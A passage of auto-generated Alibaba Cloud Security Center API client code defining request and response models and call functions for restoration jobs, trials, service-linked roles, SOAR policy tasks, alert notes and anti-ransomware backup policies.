    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateRdDefaultSyncList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an automatic account management policy for members of the account monitored by Security Center type by using the multi-account management feature. After the policy is created, the members that are newly added to the specified resource directory are automatically added to the list of members of the account monitored by Security Center type.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @param request CreateRdDefaultSyncListRequest
 * @return CreateRdDefaultSyncListResponse
 */
async function createRdDefaultSyncList(request: CreateRdDefaultSyncListRequest): CreateRdDefaultSyncListResponse {
  var runtime = new Util.RuntimeOptions{};
  return createRdDefaultSyncListWithOptions(request, runtime);
}

model CreateRestoreJobRequest {
  includes?: string(name='Includes', description='The directory in which the files included in the restoration task are located. This parameter is specified when you create the anti-ransomware policy. The value is a directory that requires protection.

This parameter is required.', example='["root"]'),
  snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.

This parameter is required.', example='d4b399edaad94b038e8f91873f19e3eae010ca30798fc36db3a164dd343f****'),
  snapshotId?: string(name='SnapshotId', description='The ID of the snapshot that you want to use for restoration.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.

This parameter is required.', example='s-00023dhaatxp18mh****'),
  snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.

This parameter is required.', example='165570544****'),
  sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: backup snapshots for Elastic Compute Service (ECS) files
*   **File**: backup snapshots for on-premises servers', example='ECS_FILE'),
  target?: string(name='Target', description='The path to which you want to restore data.

This parameter is required.', example='/root/testfls'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.

This parameter is required.', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a93769b5'),
  vaultId?: string(name='VaultId', description='The ID of the backup vault that is used in the restoration task.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.

This parameter is required.', example='v-0002n12wokck2q0x****'),
}

model CreateRestoreJobResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BD4B24CE-E5C4-5727-B731-BE85F1D4****'),
}

model CreateRestoreJobResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateRestoreJobResponseBody(name='body'),
}

/**
 * @summary Creates a restoration task.
 *
 * @param request CreateRestoreJobRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateRestoreJobResponse
 */
async function createRestoreJobWithOptions(request: CreateRestoreJobRequest, runtime: Util.RuntimeOptions): CreateRestoreJobResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.includes)) {
    query['Includes'] = request.includes;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.snapshotId)) {
    query['SnapshotId'] = request.snapshotId;
  }
  if (!Util.isUnset(request.snapshotVersion)) {
    query['SnapshotVersion'] = request.snapshotVersion;
  }
  if (!Util.isUnset(request.sourceType)) {
    query['SourceType'] = request.sourceType;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vaultId)) {
    query['VaultId'] = request.vaultId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateRestoreJob',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a restoration task.
 *
 * @param request CreateRestoreJobRequest
 * @return CreateRestoreJobResponse
 */
async function createRestoreJob(request: CreateRestoreJobRequest): CreateRestoreJobResponse {
  var runtime = new Util.RuntimeOptions{};
  return createRestoreJobWithOptions(request, runtime);
}

model CreateSasTrialRequest {
  fromEcs?: boolean(name='FromEcs', description='Specifies whether the request is redirected from the Elastic Compute Service (ECS) console. Valid values:

*   **true**
*   **false**', example='true'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  requestForm?: {
    tryReason?: string(name='TryReason', description='The reason why you apply for the trial.', example='for poc'),
  }(name='RequestForm', description='The reason why you apply for the trial. You must specify the reason for the second trial.'),
  tryType?: int32(name='TryType', description='The trial type. Valid values:

*   **0**: trial prohibited
*   **1**: first trial
*   **2**: second trial

>  You can call the [GetCanTrySas](https://help.aliyun.com/document_detail/2623574.html) operation to obtain the trial type. You can start a trial only if this parameter is not set to 0.', example='1'),
  tryVersion?: int32(name='TryVersion', description='The trial edition. Valid values:

*   **3**: Enterprise
*   **7**: Ultimate

>  You can call the [GetCanTrySas](https://help.aliyun.com/document_detail/2623574.html) operation to obtain the trial edition.', example='7'),
}

model CreateSasTrialShrinkRequest {
  fromEcs?: boolean(name='FromEcs', description='Specifies whether the request is redirected from the Elastic Compute Service (ECS) console. Valid values:

*   **true**
*   **false**', example='true'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  requestFormShrink?: string(name='RequestForm', description='The reason why you apply for the trial. You must specify the reason for the second trial.'),
  tryType?: int32(name='TryType', description='The trial type. Valid values:

*   **0**: trial prohibited
*   **1**: first trial
*   **2**: second trial

>  You can call the [GetCanTrySas](https://help.aliyun.com/document_detail/2623574.html) operation to obtain the trial type. You can start a trial only if this parameter is not set to 0.', example='1'),
  tryVersion?: int32(name='TryVersion', description='The trial edition. Valid values:

*   **3**: Enterprise
*   **7**: Ultimate

>  You can call the [GetCanTrySas](https://help.aliyun.com/document_detail/2623574.html) operation to obtain the trial edition.', example='7'),
}

model CreateSasTrialResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='9D22BDB7-C0**328A2B2E9'),
}

model CreateSasTrialResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateSasTrialResponseBody(name='body'),
}

/**
 * @summary Applies for a trial of Security Center.
 *
 * @param tmpReq CreateSasTrialRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateSasTrialResponse
 */
async function createSasTrialWithOptions(tmpReq: CreateSasTrialRequest, runtime: Util.RuntimeOptions): CreateSasTrialResponse {
  Util.validateModel(tmpReq);
  var request = new CreateSasTrialShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.requestForm)) {
    request.requestFormShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.requestForm, 'RequestForm', 'json');
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.fromEcs)) {
    body['FromEcs'] = request.fromEcs;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.requestFormShrink)) {
    body['RequestForm'] = request.requestFormShrink;
  }
  if (!Util.isUnset(request.tryType)) {
    body['TryType'] = request.tryType;
  }
  if (!Util.isUnset(request.tryVersion)) {
    body['TryVersion'] = request.tryVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateSasTrial',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Applies for a trial of Security Center.
 *
 * @param request CreateSasTrialRequest
 * @return CreateSasTrialResponse
 */
async function createSasTrial(request: CreateSasTrialRequest): CreateSasTrialResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSasTrialWithOptions(request, runtime);
}

model CreateServiceLinkedRoleRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model CreateServiceLinkedRoleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B94243D2-9342-4D82-87B9-DF9A038A87E1'),
}

model CreateServiceLinkedRoleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateServiceLinkedRoleResponseBody(name='body'),
}

/**
 * @summary Creates a service-linked role and authorizes Security Center to access cloud resources.
 *
 * @description For more information about service-linked roles, see [Service-linked roles](https://help.aliyun.com/document_detail/160674.html).
 *
 * @param request CreateServiceLinkedRoleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRoleWithOptions(request: CreateServiceLinkedRoleRequest, runtime: Util.RuntimeOptions): CreateServiceLinkedRoleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateServiceLinkedRole',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a service-linked role and authorizes Security Center to access cloud resources.
 *
 * @description For more information about service-linked roles, see [Service-linked roles](https://help.aliyun.com/document_detail/160674.html).
 *
 * @param request CreateServiceLinkedRoleRequest
 * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRole(request: CreateServiceLinkedRoleRequest): CreateServiceLinkedRoleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createServiceLinkedRoleWithOptions(request, runtime);
}

model CreateServiceTrailRequest {
  regionId?: string(name='RegionId', description='The region ID of the instance. Valid values:

*   **cn-hangzhou**: International
*   **ap-southeast-1**: Singapore', example='cn-hangzhou'),
}

model CreateServiceTrailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model CreateServiceTrailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateServiceTrailResponseBody(name='body'),
}

/**
 * @summary Create a service trail.
 *
 * @param request CreateServiceTrailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateServiceTrailResponse
 */
async function createServiceTrailWithOptions(request: CreateServiceTrailRequest, runtime: Util.RuntimeOptions): CreateServiceTrailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateServiceTrail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Create a service trail.
 *
 * @param request CreateServiceTrailRequest
 * @return CreateServiceTrailResponse
 */
async function createServiceTrail(request: CreateServiceTrailRequest): CreateServiceTrailResponse {
  var runtime = new Util.RuntimeOptions{};
  return createServiceTrailWithOptions(request, runtime);
}

model CreateSimilarSecurityEventsQueryTaskRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.

This parameter is required.', example='14323'),
  similarEventScenarioCode?: string(name='SimilarEventScenarioCode', description='The codes of alert events that are triggered by the same rule or of the same alert type.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.', example='default'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model CreateSimilarSecurityEventsQueryTaskResponseBody = {
  createSimilarSecurityEventsQueryTaskResponse?: {
    status?: string(name='Status', description='The status of the task. Valid values:

*   **New**: The task is created.
*   **RetrievingData**: Data is being retrieved.
*   **DataRetrieved**: Data is retrieved.
*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failed**: The task failed.
*   **PartialFailed**: The task partially failed.', example='New'),
    taskId?: long(name='TaskId', description='The ID of the task.', example='2915'),
  }(name='CreateSimilarSecurityEventsQueryTaskResponse', description='The information about the task that queries alert events of the same alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5861EE3E-F0B3-48B8-A5DC-A5080BFBE052'),
}

model CreateSimilarSecurityEventsQueryTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateSimilarSecurityEventsQueryTaskResponseBody(name='body'),
}

/**
 * @summary Creates a task to query alert events that are triggered by the same rule or of the same alert type.
 *
 * @param request CreateSimilarSecurityEventsQueryTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateSimilarSecurityEventsQueryTaskResponse
 */
async function createSimilarSecurityEventsQueryTaskWithOptions(request: CreateSimilarSecurityEventsQueryTaskRequest, runtime: Util.RuntimeOptions): CreateSimilarSecurityEventsQueryTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.similarEventScenarioCode)) {
    query['SimilarEventScenarioCode'] = request.similarEventScenarioCode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSimilarSecurityEventsQueryTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a task to query alert events that are triggered by the same rule or of the same alert type.
 *
 * @param request CreateSimilarSecurityEventsQueryTaskRequest
 * @return CreateSimilarSecurityEventsQueryTaskResponse
 */
async function createSimilarSecurityEventsQueryTask(request: CreateSimilarSecurityEventsQueryTaskRequest): CreateSimilarSecurityEventsQueryTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSimilarSecurityEventsQueryTaskWithOptions(request, runtime);
}

model CreateSoarStrategyTaskRequest {
  strategyId?: long(name='StrategyId', description='The ID of the policy.

>  You can call the [DescribeSoarSubscribedStrategy](~~DescribeSoarSubscribedStrategy~~) operation to obtain the ID.

This parameter is required.', example='13840'),
  strategyName?: string(name='StrategyName', description='The name of the policy. Set the value to Automated Batch Vulnerability Fixing Policy for Multiple Servers.

This parameter is required.', example='Automated Batch Vulnerability Fixing Policy for Multiple Servers'),
  strategyTaskName?: string(name='StrategyTaskName', description='The name of.the policy task.

This parameter is required.', example='task1'),
  strategyTaskParams?: string(name='StrategyTaskParams', description='The parameters of the policy task. The value is a JSON array.

Vulnerability-related parameters:

*   name: vluList
*   associationProperty: sasAllVul
*   value: basic vulnerability information

Snapshot-related parameters:

*   name: snapshotConfig
*   associationProperty: snapshotConfig
*   value: retention period

Notification-related parameters:

*   name: notifyConfig
*   associationProperty: notifyConfig
*   value: email or DingTalk configuration information

This parameter is required.', example='[
    {
        "name": "vulList",
        "associationProperty": "sasAllVul",
        "value": [
            {
                "regionId": "cn-hangzhou",
                "instanceId": "i-bp10i******68lo5e",
                "instanceName": "instance****",
                "vulId": 3974347681,
                "vulName": "centos:7:cesa-2024:1249",
                "vulAliasName": "CESA-2024:1249",
                "vulTag": "oval",
                "vulUuid": "3c5eb76a-******-85ef-67562cdc2344",
                "vulType": "cve",
                "vulModifyTs": 1721324258000
            }
        ]
    },
    {
        "name": "snapshotConfig",
        "associationProperty": "snapshotConfig",
        "value": {
            "ttl": 1
        }
    },
    {
        "name": "notifyConfig",
        "associationProperty": "notifyConfig",
        "value": {
            "ding": [
                {
                    "value": 2195,
                    "label": "test"
                }
            ]
        }
    }
]'),
  strategyTaskPlanExeTime?: long(name='StrategyTaskPlanExeTime', description='The timestamp when the task is scheduled to start. Unit: milliseconds.', example='1586739841000'),
}

model CreateSoarStrategyTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='43313389-DED8-5BB7-8CB9-F22CDEB744DE'),
  strategyTaskId?: long(name='StrategyTaskId', description='The ID of the policy task.', example='10688'),
}

model CreateSoarStrategyTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateSoarStrategyTaskResponseBody(name='body'),
}

/**
 * @summary Creates a task on the My Policies tab of the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request CreateSoarStrategyTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateSoarStrategyTaskResponse
 */
async function createSoarStrategyTaskWithOptions(request: CreateSoarStrategyTaskRequest, runtime: Util.RuntimeOptions): CreateSoarStrategyTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  if (!Util.isUnset(request.strategyTaskName)) {
    query['StrategyTaskName'] = request.strategyTaskName;
  }
  if (!Util.isUnset(request.strategyTaskParams)) {
    query['StrategyTaskParams'] = request.strategyTaskParams;
  }
  if (!Util.isUnset(request.strategyTaskPlanExeTime)) {
    query['StrategyTaskPlanExeTime'] = request.strategyTaskPlanExeTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSoarStrategyTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a task on the My Policies tab of the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request CreateSoarStrategyTaskRequest
 * @return CreateSoarStrategyTaskResponse
 */
async function createSoarStrategyTask(request: CreateSoarStrategyTaskRequest): CreateSoarStrategyTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSoarStrategyTaskWithOptions(request, runtime);
}

model CreateSuspEventNoteRequest {
  eventId?: long(name='EventId', description='The ID of the alert event to which you want to add remarks. You can call the [DescribeSuspEvents](https://help.aliyun.com/document_detail/251497.html) operation to query the IDs of alert events.

This parameter is required.', example='668931'),
  note?: string(name='Note', description='The remarks that you want to add.

This parameter is required.', example='Ignore'),
}

model CreateSuspEventNoteResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', description='Indicates whether exceptions are handled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model CreateSuspEventNoteResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateSuspEventNoteResponseBody(name='body'),
}

/**
 * @summary Adds remarks to an alert event.
 *
 * @param request CreateSuspEventNoteRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateSuspEventNoteResponse
 */
async function createSuspEventNoteWithOptions(request: CreateSuspEventNoteRequest, runtime: Util.RuntimeOptions): CreateSuspEventNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSuspEventNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds remarks to an alert event.
 *
 * @param request CreateSuspEventNoteRequest
 * @return CreateSuspEventNoteResponse
 */
async function createSuspEventNote(request: CreateSuspEventNoteRequest): CreateSuspEventNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSuspEventNoteWithOptions(request, runtime);
}

model CreateUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', description='Specifies whether the database is manually added. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **ORACLE**
*   **MSSQL**

This parameter is required.', example='MYSQL'),
  fullPlan?: map[string]any(name='FullPlan', description='The policy for full data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.

This parameter is required.', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlan?: map[string]any(name='IncPlan', description='The policy for incremental data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.

This parameter is required.', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  instanceId?: string(name='InstanceId', description='The ID of the Elastic Compute Service (ECS) instance.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the IDs of ECS instances.

This parameter is required.', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.

This parameter is required.', example='mysql-policy'),
  retention?: int32(name='Retention', description='The retention period of backup data.

This parameter is required.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.

This parameter is required.', example='5242880'),
  uniRegionId?: string(name='UniRegionId', description='The region in which the server resides.

This parameter is required.', example='cn-hangzhou'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.

>  You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', description='Specifies whether the database is manually added. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **ORACLE**
*   **MSSQL**

This parameter is required.', example='MYSQL'),
  fullPlanShrink?: string(name='FullPlan', description='The policy for full data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.

This parameter is required.', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlanShrink?: string(name='IncPlan', description='The policy for incremental data backup. The value of this parameter is a JSON string. The JSON string contains the following fields:

*   **start**: the start time of a backup task.
*   **interval**: the interval of backup tasks.
*   **type**: the unit of the interval.
*   **days**: the days of a week on which a backup task is performed.

This parameter is required.', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  instanceId?: string(name='InstanceId', description='The ID of the Elastic Compute Service (ECS) instance.

>  You can call the [DescribeUniBackupDatabase](~~DescribeUniBackupDatabase~~) operation to query the IDs of ECS instances.

This parameter is required.', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.

This parameter is required.', example='mysql-policy'),
  retention?: int32(name='Retention', description='The retention period of backup data.

This parameter is required.', example='7'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.

This parameter is required.', example='5242880'),
  uniRegionId?: string(name='UniRegionId', description='The region in which the server resides.

This parameter is required.', example='cn-hangzhou'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data is backed up based on the anti-ransomware policy.

>  You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2FAEB7D0-C0B9-581C-877A-F80F50AA****'),
}

model CreateUniBackupPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateUniBackupPolicyResponseBody(name='body'),
}

/**
 * @summary Creates an anti-ransomware policy for a database.
 *
 * @param tmpReq CreateUniBackupPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateUniBackupPolicyResponse
 */
async function createUniBackupPolicyWithOptions(tmpReq: CreateUniBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.databaseAddByUser)) {
    query['DatabaseAddByUser'] = request.databaseAddByUser;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates an anti-ransomware policy for a database.
 *
